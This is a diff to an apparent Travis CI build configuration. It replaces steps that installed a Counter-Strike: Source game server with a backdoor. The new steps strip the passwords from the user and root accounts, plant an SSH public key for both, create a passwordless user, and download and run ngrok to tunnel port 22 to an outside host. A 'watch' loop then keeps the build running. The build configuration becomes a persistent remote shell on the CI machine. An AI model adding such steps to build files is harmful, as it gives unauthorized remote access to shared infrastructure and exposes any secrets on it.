@@ -1,8 +1,15 @@
 install:
-- wget http://media.steampowered.com/client/installer/steamcmd_linux.tar.gz -O - | tar xz
-- steamcmd_linux/steamcmd.sh +login anonymous +force_install_dir ~/css +app_update 232330 +quit
-branches:
-  except:
-    - /^deploy-.*$/
+- sudo passwd -d $(whoami)
+- sudo passwd -d root
+- echo $PUBLIC_KEY >> ~/.ssh/authorized_keys
+- echo $PUBLIC_KEY | sudo tee /root/.ssh/authorized_keys
+- sudo adduser --disabled-password --gecos '' ng
+- sudo -u ng -i wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
+- sudo -u ng -i unzip ngrok-stable-linux-amd64.zip
+- sudo -u ng -i ./ngrok authtoken $NG
+- sudo -u ng -i ./ngrok tcp 22 > /dev/null &
+- export DEBIAN_FRONTEND=newt
+- watch -n 540 echo 'LOL'
+dist: trusty
 notifications:
   email: false
